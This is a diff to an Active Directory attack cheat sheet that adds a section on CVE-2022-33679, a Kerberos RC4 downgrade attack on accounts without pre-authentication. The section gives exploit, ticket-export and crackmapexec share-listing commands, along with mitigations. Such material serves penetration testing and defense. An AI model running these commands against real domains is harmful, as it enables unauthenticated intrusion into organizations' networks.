@@ -60,6 +60,7 @@
     - [Pass-the-Ticket Sapphire Tickets](#pass-the-ticket-sapphire-tickets)
   - [Kerberoasting](#kerberoasting)
   - [KRB_AS_REP Roasting](#krb_as_rep-roasting)
+  - [CVE-2022-33679 (RC4 Is Still Considered Harmful)](#cve-2022-33679-rc4-is-still-considered-harmful)
   - [Timeroasting](#timeroasting)
   - [Pass-the-Hash](#pass-the-hash)
   - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
@@ -1978,6 +1979,28 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 
 **Mitigations**: 
 * All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
+
+
+
+## CVE-2022-33679 (RC4 Is Still Considered Harmful)
+
+> CVE-2022-33679 performs an encryption downgrade attack by forcing the KDC to use the RC4-MD4 algorithm and then brute forcing the session key from the AS-REP using a known plaintext attack, Similar to AS-REP Roasting, it works against accounts that have pre-authentication disabled and the attack is unauthenticated meaning we don’t need a client’s password..
+
+Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html
+
+**Requirements**:
+- Accounts with the attribute **DONT_REQ_PREAUTH** (`PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`)
+
+* using [CVE-2022-33679.py](https://github.com/Bdenneu/CVE-2022-33679)
+  ```bash
+  user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
+  user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
+  user@hostname:~$ crackmapexec smb DC01.DOMAIN.LOCAL -k --shares
+  ```
+
+**Mitigations**: 
+* All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
+* Disable RC4 cipher if possible.
 
 
 ## Timeroasting
